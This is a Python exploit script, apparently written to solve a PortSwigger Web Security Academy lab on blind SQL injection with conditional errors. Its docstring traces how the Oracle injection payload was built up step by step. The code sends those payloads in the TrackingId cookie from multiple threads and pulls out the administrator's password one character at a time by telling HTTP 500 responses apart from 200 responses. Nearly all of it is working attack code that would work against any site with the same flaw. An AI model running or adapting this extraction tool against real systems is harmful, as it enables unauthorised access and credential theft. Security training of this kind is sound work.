import concurrent.futures
import string
import time
import timeit
from collections import defaultdict
import random
import requests
import backoff

""" Exploiting blind SQL injection by triggering conditional errors
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

The original SQL-query is something like this:
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<TrackingId from cookie>'

https://portswigger.net/web-security/sql-injection/cheat-sheet
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual 

PoC: (put this in cookie as TrackingId)
Error response (HTTP 500):
xyz' union select case when (1=1) then to_char(1/0) else null end from dual -- 
Normal response (HTTP 200):
xyz' union select case when (1=2) then to_char(1/0) else null end from dual -- 

Together with original query
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xyz' union select case when (1=1) then to_char(1/0) else null end from dual -- '

Evolution of exploit:
xyz' union select case when (1=1) then to_char(1/0) else null end from dual -- 
xyz' union select case when (SUBSTR('foobar', 1, 1) = 'x') then to_char(1/0) else null end from dual --
xyz' union select case when (SUBSTR((select username from users where username = 'administrator'), 1, 1) = 'a') then to_char(1/0) else null end from dual -- 
xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), 1, 1) = 'v') then to_char(1/0) else null end from dual -- 
f"xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), 1, {len(to_try)}) = '{to_try}') then to_char(1/0) else null end from dual"
"""

# TODO: change url to challenge url
url = "https://ac881f5a1f0f744480027588006700f4.web-security-academy.net/"


def bruteforce_password(candidates):
    """
    getting the password, {lookahead} characters at a time.

    Starts batches of {lookahead} characters.
    If one batch is finished, the next gets started.

    If a character is reported to not exist, all queued requests for following characters get canceled.
    It is not possible to cancel already started threads.
    """

    lookahead = 10

    """ for better output of progress.
    Characters not yet retrieved gets displayed as "?" 
    """
    password = defaultdict(lambda: "?")

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        pos_to_check = 0
        want_next_batch = True

        while want_next_batch:

            futures = {}

            for _ in range(lookahead):
                f"""
                starts {lookahead} threads
                """

                futures[pos_to_check] = executor.submit(bruteforce_password_character, candidates, pos_to_check)
                pos_to_check += 1

            for thread in concurrent.futures.as_completed(futures.values()):
                """results as yielded by as_completed"""
                if not thread.cancelled():
                    result_pos, result_character = thread.result()

                    if type(result_character) == str:
                        """found a valid character at this position. Add to overall result"""
                        password[result_pos] = result_character

                        print(result_pos, result_character, show_current_password(password))
                    else:
                        """found a position without valid character.
                        Cancel execution of all **not yet started** futures,
                        if they would check a position behind the last confirmed as nonexistent  
                        """
                        for future_pos, future_remaining in futures.items():
                            if future_pos > result_pos and not future_remaining.cancelled():
                                future_remaining.cancel()

                        want_next_batch = False

    return show_current_password(password)


def bruteforce_password_character(candidates, pos):
    for candidate in candidates:
        if try_candidate(pos, candidate):
            return pos, candidate
    else:
        print(f"\n tried all candidates for position {pos}")
        return pos, False


def bruteforce_password_character_offline(_candidates, pos):
    """mock function for debug of concurrency"""

    time.sleep(random.uniform(1, 5))
    try:
        return pos, "administrator"[pos]
    except IndexError:
        print(f"\n Index out of bounds at pos {pos}")
        return pos, False


def try_candidate(pos, candidate):
    pos += 1  # oracle indices starts with 1...
    payload = f"xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), {pos}, 1) = '{candidate}') then to_char(1/0) else null end from dual -- "
    # print(f"SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{payload}'")
    return exploit(payload)


def exploit_on_backoff(_details):
    print("/", end="")


@backoff.on_exception(
    backoff.expo,
    requests.exceptions.RequestException,
    max_tries=8,
    on_backoff=exploit_on_backoff,
)
def exploit(payload):
    cookies = {"session": "whatever", "TrackingId": payload}

    with requests.get(url, cookies=cookies, timeout=3) as res:
        if res.status_code == 504:
            raise Exception("Server returned 504")

        if res.status_code != 500:
            print(".", end="")
            return False

        return True


def show_current_password(password: defaultdict):
    ret = ""
    for char in range(max(password.keys()) + 1):
        ret += password[char]

    return ret


def get_candidates_alphanumeric():
    """this challenge only uses lowercase and numbers.
    To be sure - and for future copy/paste - don't forget the uppercase letters"""
    return string.ascii_lowercase + "0123456789" + string.ascii_uppercase


def main():
    candidates = get_candidates_alphanumeric()
    password = bruteforce_password(candidates)
    print(password)


if __name__ == '__main__':
    time_elapsed = timeit.timeit(main, number=1)
    print(f"Execution took {time_elapsed} seconds.")  # about 95 seconds
